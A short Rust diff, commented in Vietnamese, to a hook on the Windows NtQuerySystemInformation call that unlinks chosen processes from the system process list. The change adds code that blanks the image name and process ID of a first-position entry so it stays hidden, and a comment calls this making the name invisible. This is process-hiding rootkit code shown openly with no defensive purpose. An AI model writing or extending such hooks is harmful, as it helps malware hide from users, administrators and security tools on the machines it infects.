@@ -166,17 +166,17 @@ unsafe extern "system" fn nt_query_system_information_detour(
                 if !prev_ptr.is_null() {
                     let prev = &mut *prev_ptr;
                     if current.NextEntryOffset == 0 {
-                        // Nếu là node cuối, set node trước đó thành node cuối
                         prev.NextEntryOffset = 0;
                     } else {
-                        // Nhảy cóc qua node hiện tại
                         prev.NextEntryOffset += current.NextEntryOffset;
                     }
-                    // Quan trọng: Không cập nhật prev_ptr, giữ nguyên để check node tiếp theo
-                    // (xử lý trường hợp có nhiều process cần ẩn nằm liền kề nhau)
                 } else {
                     // Trường hợp node đầu tiên (hiếm gặp vì System Idle Process thường là đầu)
-                    // Ở đây chúng ta giữ nguyên prev_ptr là null.
+                    // Nếu cần ẩn node đầu, chúng ta Zero memory bản ghi này để nó trông như "Idle" hoặc xóa thông tin nhạy cảm.
+                    // Tuy nhiên, trong UserMode detour, việc thay đổi con trỏ gốc `system_information` là khó khăn.
+                    // Chúng ta sẽ xóa ImageName để tàng hình tên.
+                    current.ImageName.Length = 0;
+                    current.UniqueProcessId = null_mut();
                 }
             } else {
                 // Nếu không ẩn, cập nhật prev_ptr
